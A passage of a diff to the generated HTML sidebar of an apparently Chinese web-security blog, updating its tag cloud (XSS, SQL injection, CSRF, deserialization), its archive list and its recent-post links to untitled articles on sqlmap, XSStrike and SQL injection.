class="tag-list-item"><a class="tag-list-link" href="/tags/%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE/" rel="tag">网络协议</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" rel="tag">网络安全</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC/" rel="tag">跨站脚本</a></li></ul>
     </div>
   </div>
 
@@ -391,7 +872,7 @@
   <div class="widget-wrap">
     <h3 class="widget-title">Tag Cloud</h3>
     <div class="widget tagcloud">
-      <a href="/tags/CSRF/" style="font-size: 20px;">CSRF</a> <a href="/tags/CTF/" style="font-size: 10px;">CTF</a> <a href="/tags/Web%E5%AE%89%E5%85%A8/" style="font-size: 20px;">Web安全</a> <a href="/tags/%E5%AE%89%E5%85%A8/" style="font-size: 20px;">安全</a> <a href="/tags/%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0/" style="font-size: 10px;">跨站请求伪造</a>
+      <a href="/tags/CSRF/" style="font-size: 10px;">CSRF</a> <a href="/tags/CTF%E9%A2%98%E7%9B%AE/" style="font-size: 10px;">CTF题目</a> <a href="/tags/Content-Type/" style="font-size: 10px;">Content-Type</a> <a href="/tags/HTTP/" style="font-size: 13.33px;">HTTP</a> <a href="/tags/HTTPS/" style="font-size: 10px;">HTTPS</a> <a href="/tags/PHP/" style="font-size: 16.67px;">PHP</a> <a href="/tags/SQL%E6%B3%A8%E5%85%A5/" style="font-size: 13.33px;">SQL注入</a> <a href="/tags/XSS/" style="font-size: 20px;">XSS</a> <a href="/tags/XSStrike/" style="font-size: 10px;">XSStrike</a> <a href="/tags/labs/" style="font-size: 10px;">labs</a> <a href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" style="font-size: 13.33px;">反序列化</a> <a href="/tags/%E5%AE%89%E5%85%A8/" style="font-size: 13.33px;">安全</a> <a href="/tags/%E5%AE%9E%E6%88%98/" style="font-size: 10px;">实战</a> <a href="/tags/%E5%AF%B9%E8%B1%A1%E6%B3%A8%E5%85%A5/" style="font-size: 10px;">对象注入</a> <a href="/tags/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/" style="font-size: 10px;">报错注入</a> <a href="/tags/%E6%95%B0%E6%8D%AE%E5%BA%93/" style="font-size: 10px;">数据库</a> <a href="/tags/%E6%AF%94%E8%BE%83%E6%BC%8F%E6%B4%9E/" style="font-size: 10px;">比较漏洞</a> <a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" style="font-size: 10px;">渗透测试</a> <a href="/tags/%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE/" style="font-size: 10px;">网络协议</a> <a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" style="font-size: 10px;">网络安全</a> <a href="/tags/%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC/" style="font-size: 10px;">跨站脚本</a>
     </div>
   </div>
 
@@ -400,7 +881,7 @@
   <div class="widget-wrap">
     <h3 class="widget-title">Archives</h3>
     <div class="widget">
-      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2025/05/">May 2025</a></li></ul>
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2025/05/">May 2025</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/05/">May 2024</a></li></ul>
     </div>
   </div>
 
@@ -413,11 +894,23 @@
       <ul>
         
           <li>
-            <a href="/2025/05/20/CSRF/CSRF%E6%94%BB%E5%87%BB%E5%AE%9E%E6%88%98%E6%A1%88%E4%BE%8B/">CSRF攻击实战案例</a>
+            <a href="/2025/05/20/Web/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/xsstrike/">(no title)</a>
           </li>
         
           <li>
-            <a href="/2025/05/20/CSRF/">CSRF攻击详解</a>
+            <a href="/2025/05/20/Web/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/sqlmap/">(no title)</a>
+          </li>
+        
+          <li>
+            <a href="/2025/05/20/Web/%E7%BB%95%E8%BF%87/%E7%BB%95%E8%BF%87/">(no title)</a>
+          </li>
+        
+          <li>
+            <a href="/2025/05/20/Web/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/SQL%E6%B3%A8%E5%85%A5/%E5%9F%BA%E7%A1%80%E6%B3%A8%E5%85%A5%E6%B5%81%E7%A8%8B/">(no title)</a>
+          </li>
+        
+          <li>
+            <a href="/2025/05/20/Web/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/SQL%E6%B3%A8%E5%85%A5/%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5/">(no title)</a>
           </li>
         
       </ul>
